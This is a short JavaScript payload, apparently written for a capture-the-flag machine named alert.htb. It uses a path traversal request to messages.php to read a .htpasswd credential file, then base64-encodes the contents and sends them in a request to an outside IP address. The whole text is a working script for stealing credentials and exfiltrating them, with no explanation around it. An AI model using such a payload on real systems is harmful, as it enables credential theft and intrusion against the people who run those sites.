var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../var/www/statistics.alert.htb/.htpasswd', false);
req.send();

var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://10.10.15.194/?b64=' + btoa(req.responseText, false));
exfil.send();
